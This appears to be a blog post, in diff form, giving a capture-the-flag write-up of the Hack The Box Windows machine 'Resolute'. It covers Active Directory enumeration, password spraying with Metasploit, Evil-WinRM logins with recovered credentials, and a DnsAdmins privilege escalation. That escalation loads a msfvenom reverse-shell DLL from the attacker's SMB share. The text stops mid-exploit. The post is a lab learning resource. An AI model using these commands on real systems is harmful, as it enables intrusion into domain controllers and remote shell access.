@@ -1,0 +1,750 @@
+---
+layout: post
+title: "[HTB] Resolute - write up"
+published: true
+date: 2020-05-30
+description:  Medium Windows box requiring quite the enumeration in order to find the correct user.
+img: posts/resolute/resolute_logo.png # Add image post (optional)
+tags: [Enumeration, Privesc, SMB, ReverseShell, DNs, services, Evil-WinRM, Windows, HTB, Medium] # add tag
+os: Windows
+difficulty: Medium
+points: 30
+release: 2019-12-07
+ip: 10.10.10.169
+---
+
+# Summary:
+
+{{ page.description }}
+
+### Foothold:
+
+```sh
+#nmap -sC -sV -oA nmap/default 10.10.10.169
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 10:56 CEST
+Nmap scan report for 10.10.10.169
+Host is up (0.076s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-29 09:06:10
+Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.lo
+cal, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup:
+MEGABANK)                                                                               464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.lo
+cal, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please s
+ubmit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=3/29%Time=5E8062C7%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h29m36s, deviation: 4h02m30s, median: 9m35s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2020-03-29T02:07:03-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-03-29T09:07:05
+|_  start_date: 2020-03-29T06:17:54
+
+Service detection performed. Please report any incorrect results at https://nmap.org/sub
+mit/ .
+Nmap done: 1 IP address (1 host up) scanned in 164.11 seconds
+```
+
+Ok this being a windows machine, we have more ports open than usual. What we'll do is run the same scan on all ports, so we are sure to capture everything and get a clear picture.
+
+```bash
+#nmap -sC -sV -p- -oA nmap/all-ports 10.10.10.169
+# Nmap 7.80 scan initiated Sun Mar 22 10:52:23 2020 as: nmap -sC -sV -p- -oA nmap/resolu
+te.default 10.10.10.169
+Nmap scan report for 10.10.10.169
+Host is up (0.052s latency).
+Not shown: 65512 closed ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-22 10:04:2
+9Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.l
+ocal, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup:
+ MEGABANK)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.l
+ocal, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49688/tcp open  msrpc        Microsoft Windows RPC
+49712/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please s
+ubmit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=3/22%Time=5E7735FB%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h29m27s, deviation: 4h02m31s, median: 9m26s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2020-03-22T03:05:22-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-03-22T10:05:19
+|_  start_date: 2020-03-21T06:11:54
+
+Service detection performed. Please report any incorrect results at https://nmap.org/sub
+mit/ .
+# Nmap done at Sun Mar 22 10:58:06 2020 -- 1 IP address (1 host up) scanned in 343.00 se
+conds
+
+```
+
+Ok one interesting line that pops up immediatly is `445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)` Indeed, we get the windows version running as well as a workgroup. There is are not http or https ports open of 80, or 443, but there are two http on 5985
+and 47001, though they both lead to 404 as is. The smb-os-discovery also yielded interesting information at least telling use that this service might be activated.
+
+As soon as I see smb running on a box, I like to refer to this link and follow the methods proposed https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
+
+Although, I always like to start with `enum4linux`. It is a long output, it's a bit buggy, but it does things automatically. Below are spinets of interesting
+
+```sh
+#enum4linux -a 10.10.10.169
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 29 11:14:39 2020
+[...]
+
+ ===========================================
+|    Getting domain SID for 10.10.10.169    |
+ ===========================================                                             Domain Name: MEGABANK
+Domain Sid: S-1-5-21-1392959593-3013219662-3596683436                                     [+] Host is part of a domain (not a workgroup)
+
+ =============================
+|    Users on 10.10.10.169    |
+ =============================
+... Account: abigail        Name: (null)    Desc: (null)
+... Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
+... Account: angela         Name: (null)    Desc: (null)
+... Account: annette        Name: (null)    Desc: (null)
+... Account: annika         Name: (null)    Desc: (null)
+... Account: claire         Name: (null)    Desc: (null)
+... Account: claude         Name: (null)    Desc: (null)
+... Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
+... Account: felicia        Name: (null)    Desc: (null)
+... Account: fred           Name: (null)    Desc: (null)
+... Account: Guest          Name: (null)    Desc: Built-in account for guest access to the computer/domain
+... Account: gustavo        Name: (null)    Desc: (null)
+... Account: krbtgt         Name: (null)    Desc: Key Distribution Center Service Account
+... Account: marcus         Name: (null)    Desc: (null)
+... Account: marko          Name: Marko Novak    Desc: Account created. Password set to Welcome123!
+
+... Account: melanie        Name: (null)    Desc: (null)
+... Account: naoki          Name: (null)    Desc: (null)
+... Account: paulo          Name: (null)    Desc: (null)
+... Account: per            Name: (null)    Desc: (null)
+... Account: ryan           Name: Ryan Bertrand     Desc: (null)
+... Account: sally          Name: (null)    Desc: (null)
+... Account: simon          Name: (null)    Desc: (null)
+... Account: steve          Name: (null)    Desc: (null)
+... Account: stevie         Name: (null)    Desc: (null)
+... Account: sunita         Name: (null)    Desc: (null)
+... Account: ulf            Name: (null)    Desc: (null)
+... Account: zach           Name: (null)    Desc: (null)
+
+
+[+] Getting domain group memberships:                        [28/1174]
+Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest                               Group 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
+Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator                         Group 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
+Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt                               Group 'Domain Users' (RID: 513) has member: MEGABANK\ryan                                 Group 'Domain Users' (RID: 513) has member: MEGABANK\marko
+Group 'Domain Users' (RID: 513) has member: MEGABANK\sunita                               Group 'Domain Users' (RID: 513) has member: MEGABANK\abigail                               Group 'Domain Users' (RID: 513) has member: MEGABANK\marcus
+Group 'Domain Users' (RID: 513) has member: MEGABANK\sally
+Group 'Domain Users' (RID: 513) has member: MEGABANK\fred
+Group 'Domain Users' (RID: 513) has member: MEGABANK\angela
+Group 'Domain Users' (RID: 513) has member: MEGABANK\felicia
+Group 'Domain Users' (RID: 513) has member: MEGABANK\gustavo                               Group 'Domain Users' (RID: 513) has member: MEGABANK\ulf
+Group 'Domain Users' (RID: 513) has member: MEGABANK\stevie                               Group 'Domain Users' (RID: 513) has member: MEGABANK\claire
+Group 'Domain Users' (RID: 513) has member: MEGABANK\paulo
+Group 'Domain Users' (RID: 513) has member: MEGABANK\steve
+Group 'Domain Users' (RID: 513) has member: MEGABANK\annette
+Group 'Domain Users' (RID: 513) has member: MEGABANK\annika                               Group 'Domain Users' (RID: 513) has member: MEGABANK\per
+Group 'Domain Users' (RID: 513) has member: MEGABANK\claude
+Group 'Domain Users' (RID: 513) has member: MEGABANK\melanie
+Group 'Domain Users' (RID: 513) has member: MEGABANK\zach
+Group 'Domain Users' (RID: 513) has member: MEGABANK\simon
+Group 'Domain Users' (RID: 513) has member: MEGABANK\naoki
+Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
+Group 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
+Group 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
+Group 'Contractors' (RID: 1103) has member: MEGABANK\ryan
+Group 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
+Group 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
+```
+
+In order:
+
+- We have confirmation of the smb domain name: `MEGABANK`
+- We have a list of users with information on some of them. Including what looks like a password for our friend `marko`: Welcome123!
+- Last is a list enumerating the groups membership. So we now know that marko is a standard user, B though other groups exists such as the Contractors group which could be interesting.
+
+Anyway. Now we should try to use marko's credential to log in.
+
+```sh
+#rpcclient -U "marko" -d "MEGABANK" 10.10.10.169
+debug_parse_params: unrecognized debug class name or format [MEGABANK]
+Enter WORKGROUP\marko's password:
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+```
+
+hum... that did not work. We have a large list of users, we may want to try this password on other users. Indeed, it could be a default password that users are requested to change, but somebody didn't.
+
+### User
+
+We can either manually go through the list, or use metasploit. For this we need a list with the user name and password on each line
+
+```sh
+#cat userpass.txt
+Administrator Welcome123!
+DefaultAccount Welcome123!
+krbtgt Welcome123!
+ryan Welcome123!
+marko Welcome123!
+sunita Welcome123!
+abigail Welcome123!
+marcus Welcome123!
+sally Welcome123!
+fred Welcome123!
+angela Welcome123!
+felicia Welcome123!
+gustavo Welcome123!
+ulf Welcome123!
+stevie Welcome123!
+claire Welcome123!
+paulo Welcome123!
+steve Welcome123!
+annette Welcome123!
+annika Welcome123!
+per Welcome123!
+claude Welcome123!
+melanie Welcome123!
+zach Welcome123!
+simon Welcome123!
+naoki Welcome123!
+```
+
+and now we launch msfconsole.
+
+```sh
+#msfconsole
+                                   ___          ____                                                                      ,-""   `.      < HONK >                                                                  ,'  _   e )`-._ /  ----                                                                   /  ,' `-._<.===-'                                                                        /  /                                                                                     /  ;                                                                           _          /   ;                                                              (`._    _.-"" ""--..__,'    |                                                              <_  `-""                     \
+  <`-                          :
+   (__   <__.                  ;
+     `-.   '-.__.      _.'    /
+        \      `-.__,-'    _,'
+         `._    ,    /__,-'
+            ""._\__,'< <____
+                 | |  `----.`.
+                 | |        \ `.
+                 ; |___      \-``
+                 \   --<
+                  `.`.<
+                    `-'
+
+       =[ metasploit v5.0.74-dev                          ]                               + -- --=[ 1969 exploits - 1088 auxiliary - 338 post       ]                               + -- --=[ 558 payloads - 45 encoders - 10 nops            ]                               + -- --=[ 7 evasion                                       ]
+
+msf5 > use scanner/smb/smb_login
+msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.169
+RHOSTS => 10.10.10.169
+msf5 auxiliary(scanner/smb/smb_login) > set SMBDomain MEGABANK
+SMBDomain => MEGABANK
+msf5 auxiliary(scanner/smb/smb_login) > set USERPASS_FILE userpass.txt
+USERPASS_FILE => userpass.txt
+msf5 auxiliary(scanner/smb/smb_login) > run
+
+[*] 10.10.10.169:445      - 10.10.10.169:445 - Starting SMB login bruteforce
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\Administrator:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\DefaultAccount:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\krbtgt:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\ryan:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\marko:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\sunita:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\abigail:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\marcus:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\sally:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\fred:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\angela:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\felicia:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\gustavo:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\ulf:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\stevie:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\claire:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\paulo:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\steve:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\annette:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\annika:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\per:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\claude:Welcome123!',
+[+] 10.10.10.169:445      - 10.10.10.169:445 - Success: 'MEGABANK\melanie:Welcome123!'
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\zach:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\simon:Welcome123!',
+[-] 10.10.10.169:445      - 10.10.10.169:445 - Failed: 'MEGABANK\naoki:Welcome123!',
+[*] 10.10.10.169:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+```
+
+Success, we have a positive hit. `melanie`'s password is `Welcome123!`. So we can now connect with it just to check:
+
+```sh
+#rpcclient -U "melanie" -d "MEGABANK" 10.10.10.169
+debug_parse_params: unrecognized debug class name or format [MEGABANK]
+Enter WORKGROUP\melanie's password:                                                    rpcclient $>
+```
+
+Great that works. Now we can either do it manually, or go the lazy route and use someone else's work. (https://github.com/Hackplayers/evil-winrm) **Evil-WinRM**
+
+```sh
+#ruby ~/Git/evil-winrm/evil-winrm.rb -i 10.10.10.169 -u melanie -p Welcome123!
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
+megabank\melanie
+Evil-WinRM* PS C:\Users\melanie\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
+0c3be45fcfe249796ccbee8d3a978540
+*Evil-WinRM* PS C:\Users\melanie\Desktop>
+```
+
+### Root
+
+Ok to get started, we'll create a tmp folder in C: where we'll upload winPEAs. Just in case we check if it is a 32 or 64 bit machine.
+
+```sh
+*Evil-WinRM* PS C:\Users\melanie\Desktop> cd c:\
+*Evil-WinRM* PS C:\> mkdir tmp
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/29/2020   4:40 AM                tmp
+
+*Evil-WinRM* PS C:\> cd tmp
+*Evil-WinRM* PS C:\tmp>
+*Evil-WinRM* PS C:\tmp> $env:PROCESSOR_ARCHITECTURE
+AMD64
+```
+
+On our local machine we launch a webserver, and we can download the enumeration program and run it. Below are only snippets that interest us in the output.
+
+```sh
+[LOCAL]
+#python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+10.10.10.169 - - [29/Mar/2020 13:54:26] "GET /winPEAS.exe HTTP/1.1" 200 -
+
+
+[TARGET]
+*Evil-WinRM* PS C:\tmp> Invoke-WebRequest http://10.10.14.201:8000/winPEAS.exe -OutFile winPEAS.exe
+*Evil-WinRM* PS C:\tmp> dir
+
+    Directory: C:\tmp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/29/2020   5:10 AM         241152 winPEAS.exe
+
+*Evil-WinRM* PS C:\tmp> ./winPEAS.exe
+
+[...]
+
+[+] Cached Creds()
+   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protectio
+ns#cached-credentials
+    cachedlogonscount is 10
+
+[...]
+
+[+] Looking for common SAM & SYSTEM backups()
+   C:\Windows\System32\config\RegBack\SAM
+   C:\Windows\System32\config\RegBack\SYSTEM
+
+
+
+```
+
+Trying to read these files leads to a permission denied. Let's put a pin on that. Let's go back to `C:\` and try to look around, maybe there is a hidden file somewhere. We can use `dir -force` to print hidden files
+
+```powershell
+*Evil-WinRM* PS C:\> dir -force
+
+    Directory: C:\
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
+d--hsl        9/25/2019  10:17 AM                Documents and Settings
+d-----        9/25/2019   6:19 AM                PerfLogs
+d-r---        9/25/2019  12:39 PM                Program Files
+d-----       11/20/2016   6:36 PM                Program Files (x86)
+d--h--        9/25/2019  10:48 AM                ProgramData
+d--h--        12/3/2019   6:32 AM                PSTranscripts
+d--hs-        9/25/2019  10:17 AM                Recovery
+d--hs-        9/25/2019   6:25 AM                System Volume Information
+d-----        3/29/2020  11:39 AM                tmp
+d-r---        12/4/2019   2:46 AM                Users
+d-----        12/4/2019   5:15 AM                Windows
+-arhs-       11/20/2016   5:59 PM         389408 bootmgr
+-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
+-a-hs-        3/29/2020  11:17 AM      402653184 pagefile.sys
+
+*Evil-WinRM* PS C:\>
+
+```
+
+We may ask ourselves what `PSTranscripts`
+
+```
+Evil-WinRM* PS C:\> cd PSTranscripts
+*Evil-WinRM* PS C:\PSTranscripts> dir -force
+
+
+    Directory: C:\PSTranscripts
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--h--        12/3/2019   6:45 AM                20191203
+
+
+*Evil-WinRM* PS C:\PSTranscripts> cd 20191203
+*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force
+
+
+    Directory: C:\PSTranscripts\20191203
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+
+
+*Evil-WinRM* PS C:\PSTranscripts\20191203>
+
+```
+
+We end up with a interesting text file.
+
+```powershell
+*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Command start time: 20191203063455
+**********************
+PS>TerminatingError(): "System error."
+>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Command start time: 20191203063455
+**********************
+PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
+PS megabank\ryan@RESOLUTE Documents>
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+*Evil-WinRM* PS C:\PSTranscripts\20191203>
+```
+
+This is some sort of output  file. But more interestingly it mentinos ryan, with a strange formed string after it: `Serv3r4Admin4cc123!` . Could we login with Evil-WinRM with ryan?
+
+```sh
+#ruby ~/Git/evil-winrm/evil-winrm.rb -i 10.10.10.169 -u ryan
+Enter Password: Serv3r4Admin4cc123!
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
+megabank\ryan
+*Evil-WinRM* PS C:\Users\ryan\Documents>
+
+```
+
+The answer is Yes! What we should do now is look at which group ryan is a member
+
+```powershell
+*Evil-WinRM* PS C:\tmp> whoami /all
+USER INFORMATION                                                                                                                                                                   ----------------
+                                                                                                                                                                                   User Name     SID
+============= ==============================================                                                                                                                       megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105
+
+GROUP INFORMATION                                                                                                                                                                  -----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+*Evil-WinRM* PS C:\tmp>
+```
+
+In this very badly formatted output, we can see that ryan is part of `MEGABANK\DnsAdmins ` (to be honest, I don't know, how you are meant to spot that unless you know of the vulnerability - winPEAS does not detect that).  So now it's just a matter of following the instructions (http://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/)
+
+First we create a payload dll that will injected.
+
+```sh
+#msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.201 LPORT=1231 --platform=windows -f dll > plugin.dll
+```
+
+We then open a SMB share so we can connect from the target. To do that we can copy a version of smbserver to our working directory
+
+```sh
+#cp /usr/share/doc/python3-impacket/examples/smbserver.py .
+#python3 smbserver.py SHARE .
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+
+```
+
+Then on our target machine we run the command to download our dll and inject the code
+
+```powershell
+PS C:\tmp> dnscmd.exe /config /serverlevelplugindll \\10.10.14.201\SHARE\plugin.dll
+
+Registry property serverlevelplugindll successfully reset.
+Command completed successfully.
+
+```
+
+In a third terminal we open a nc listener
+
+```sh
+#nc -lvnp 1231
+listening on [any] 1231 ...
+```
+
+and finally we can restart the dns service on the target
+
+```powershell
+*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 3  STOP_PENDING
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
